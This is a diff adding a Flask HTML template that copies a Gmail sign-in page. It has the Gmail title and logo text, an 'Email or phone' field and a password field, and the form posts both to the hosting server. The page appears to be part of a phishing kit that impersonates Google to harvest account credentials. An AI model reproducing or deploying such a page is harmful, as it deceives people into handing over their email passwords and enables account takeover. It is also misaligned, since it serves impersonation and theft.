@@ -1,0 +1,20 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gmail</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='gmail.css') }}">
+</head>
+<body>
+<div class="gmail-container">
+    <div class="gmail-form">
+        <div class="gmail-logo">Gmail</div>
+        <form method="POST">
+            <input type="text" name="email" placeholder="Email or phone" class="gmail-input" required>
+            <input type="password" name="password" placeholder="Password" class="gmail-input" required>
+            <button type="submit" class="gmail-btn">Next</button>
+        </form>
+    </div>
+</div>
+</body>
+</html>
